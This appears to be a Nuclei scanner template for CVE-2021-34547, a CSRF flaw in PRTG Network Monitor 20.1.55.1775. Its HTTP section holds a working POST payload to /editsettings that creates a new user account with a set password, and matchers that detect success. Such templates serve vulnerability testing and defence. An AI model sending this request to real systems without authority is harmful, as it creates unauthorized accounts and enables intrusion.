id: CVE-2021-34547

info:
  name: PRTG Network Monitor 20.1.55.1775 CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: PRTG Network Monitor 20.1.55.1775 allows /editsettings CSRF for user account creation.
  impact: |
    An attacker can perform unauthorized actions on behalf of an authenticated user
  remediation: |
    Apply the vendor-supplied patch or update to the latest version
  reference: https://github.com/likhihcv/PRTG_Network_Monitor_20.1.55.1775_CSRF

http:
  - method: POST
    path:
      - "{{BaseURL}}/editsettings"

    body: |
      login_=User_test2&name_=User_test2&email_=cvlikhith@gmail.com&passwordradio=1&password1=Hello123&password2=Hello123&usertype_=0&allowack_=0&allowpwchange_=0&primarygroup_=201|PRTG Users Group|||0|&active_=1&autorefreshtype_=1&autorefreshinterval_=30&playsound_=0&timezone_=Dateline Standard Time|(UTC-12:00) International Date Line West&dateformat_=0&theme_=0&ticketmail_=1&objecttype=user&id=new&targeturl=/systemsetup.htm?tabid=5

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "User has been created"
          - "Account successfully created"
        part: body
